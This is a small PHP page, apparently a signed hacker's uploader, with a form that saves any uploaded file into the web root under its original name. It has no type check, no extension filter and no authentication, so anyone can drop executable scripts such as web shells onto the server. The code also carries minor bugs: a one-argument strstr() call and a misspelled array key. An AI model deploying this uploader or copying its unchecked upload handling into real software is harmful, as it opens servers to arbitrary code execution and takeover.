<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
</head>
<body style="text-align:center">
<form action="" method="post" enctype="multipart/form-data">
Choose:
<input type="file" name="up_picture"/><br>
<input type="submit" name="file1" value="UPlOAD"> </input>
</form>
    <?php
    if(!empty($_FILES["up_picture"]["name"])){
		if($_FILES['up_picture']['error']>0){
			echo 'cuowu';}
			else{
				$path='./'.$_FILES['up_picture']['name'].strstr($_FILES['up_picture']['name']);
				if(is_uploaded_file($_FILES['up_picture']['tmp_name'])){	//ss
			if(!move_uploaded_file($_FILES['up_picture']['tmp_name'],$path)){	//ss
				echo "shibai";
			}else{
				echo "File---".$_FILES['up_picture']['name']."--Successful--".$_FILES['up_picture']['size'];	
			}
		}else{
			echo "upload File".$_FILES['up_pictute']['name']."bnwk";
		}
				}
		}
	?>
<br>
DQML
<br>
<br>
<span style="color:#F00; font-weight:bold;">HWC-黑无常</span>-hwc<br><br>
<a href="http://www.chinacycc.com/forum.php" hidefocus="true" title="Portal">作者网站<span>Portal</span></a>
<body>
</html>